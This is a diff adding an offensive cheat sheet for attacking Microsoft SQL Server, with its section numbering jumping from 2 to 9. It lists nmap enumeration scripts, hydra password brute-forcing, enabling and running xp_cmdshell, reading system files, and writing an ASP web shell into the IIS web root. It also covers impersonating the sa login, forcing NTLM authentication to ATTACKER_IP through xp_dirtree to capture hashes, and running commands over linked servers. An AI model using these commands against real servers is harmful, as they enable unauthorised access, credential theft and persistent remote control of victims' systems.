@@ -1,0 +1,108 @@
+==============================
+MSSQL (Microsoft SQL Server)
+Cheat Sheet – Professional
+==============================
+
+PORT:
+1433/TCP – MSSQL default
+1434/UDP – SQL Browser
+
+Transport:
+TCP / UDP
+
+Authentication:
+- SQL Authentication
+- Windows Authentication (AD)
+
+Purpose:
+Enterprise database backend
+(AD-integrated environments)
+
+--------------------------------
+1. BASIC ENUMERATION
+--------------------------------
+
+# Basic scan
+nmap -p1433 -sV <IP>
+
+# MSSQL scripts
+nmap -p1433 --script ms-sql-* <IP>
+
+# SQL Browser
+nmap -p1434 -sU <IP>
+
+--------------------------------
+2. BANNER & INFO ENUM
+--------------------------------
+
+# Version & instance info
+nmap -p1433 -sV \
+--script=ms-sql-info,ms-sql-empty-password,ms-sql-ntlm,ms-sql-config,ms-sql-xp-cmdshell,ms-sql-tables,ms-sql-hashdbaccess,ms-sql-dac,ms-sql-dump-hashes \
+--script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=\"\",mssql.instance-name=MSSQLSERVER" \
+<IP>
+
+SQL Auth:
+user / password
+
+Windows Auth:
+DOMAIN\user / password or NTLM hash
+
+hydra -L users.txt -P passwords.txt mssql://<IP>
+
+use auxiliary/scanner/mssql/mssql_login
+
+sqsh -S <IP> -U user -P password
+mssqlclient.py user@<IP>
+mssqlclient.py DOMAIN/user@<IP> -windows-auth
+
+SELECT name FROM sys.databases;
+USE dbname;
+SELECT name FROM sys.tables;
+SELECT * FROM table;
+
+SELECT name FROM sys.sql_logins;
+SELECT name FROM sys.database_principals;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+SELECT * FROM sys.server_principals;
+
+--------------------------------
+9. COMMAND EXECUTION (xp_cmdshell)
+--------------------------------
+
+# Check xp_cmdshell
+EXEC sp_configure 'xp_cmdshell';
+
+# Enable (if sysadmin)
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+# Execute command
+EXEC xp_cmdshell 'whoami';
+
+# Read file
+SELECT * FROM OPENROWSET(
+  BULK 'C:\Windows\System32\drivers\etc\hosts',
+  SINGLE_CLOB
+) AS contents;
+
+EXEC xp_cmdshell 'echo ^<%eval request("cmd")%^> > C:\inetpub\wwwroot\shell.asp';
+
+SELECT name FROM sys.server_principals WHERE type_desc='SQL_LOGIN';
+EXECUTE AS LOGIN = 'sa';
+SELECT SYSTEM_USER;
+
+EXEC xp_dirtree '\\ATTACKER_IP\share';
+
+EXEC sp_linkedservers;
+EXEC ('whoami') AT linked_server;
+
+C:\Program Files\Microsoft SQL Server\*\MSSQL\Log\ERRORLOG
+Windows Event Logs
+
+nmap
+hydra
+metasploit
+impacket (mssqlclient.py)
+sqsh
+responder
+
